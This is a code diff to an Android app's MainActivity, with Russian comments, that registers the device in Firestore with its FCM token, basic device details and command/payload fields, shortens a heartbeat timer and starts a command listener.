@@ -42,7 +42,7 @@ class MainActivity : Activity() {
     }
     // === HEARTBEAT (обновление статуса каждые 10 мин) ===
     private val heartbeatHandler = Handler(Looper.getMainLooper())
-    private val heartbeatInterval = 1 * 60 * 1000L // 10 минут
+    private val heartbeatInterval = 1 * 30 * 1000L // 10 минут
     private val heartbeatRunnable = object : Runnable {
         override fun run() {
             sendHeartbeat()                                // отправляем обновление
@@ -142,6 +142,8 @@ class MainActivity : Activity() {
         FirebaseMessaging.getInstance().token
             .addOnSuccessListener { token ->
                 Log.d("FCM", "✅ Token fetched: $token")
+
+                // данные для Firestore при первой регистрации устройства
                 val data = mapOf(
                     "token" to token,
                     "brand" to Build.BRAND,
@@ -149,7 +151,9 @@ class MainActivity : Activity() {
                     "sdk" to Build.VERSION.SDK_INT,
                     "timestamp" to System.currentTimeMillis(),
                     "status" to "online",
-                    "command" to "idle"
+                    "command" to "idle",
+                    "commandId" to "init",                // 🆕 базовое значение
+                    "payload" to emptyMap<String, Any>()  // 🆕 пустой объект payload
                 )
 
                 db.collection("devices").document(deviceId)
@@ -165,20 +169,24 @@ class MainActivity : Activity() {
             .addOnFailureListener { e ->
                 Log.e("FCM", "❌ Failed to fetch FCM token", e)
 
-                // Даже если токен не получен (нет сети и т.д.), всё равно создадим запись
+                // Даже если токен не получен (например, нет сети)
                 val localId = deviceId
-                val data = mapOf(
+                val fallbackData = mapOf(
                     "brand" to Build.BRAND,
                     "model" to Build.MODEL,
                     "sdk" to Build.VERSION.SDK_INT,
                     "timestamp" to System.currentTimeMillis(),
                     "status" to "online",
-                    "token" to "unavailable"
+                    "token" to "unavailable",
+                    "command" to "idle",
+                    "commandId" to "init",
+                    "payload" to emptyMap<String, Any>()
                 )
                 db.collection("devices").document(localId)
-                    .set(data, com.google.firebase.firestore.SetOptions.merge())
+                    .set(fallbackData, SetOptions.merge())
                     .addOnSuccessListener {
                         Log.d("FIRESTORE", "✅ Device registered without token (ID: $localId)")
+                        startCommandListener()
                     }
             }
     
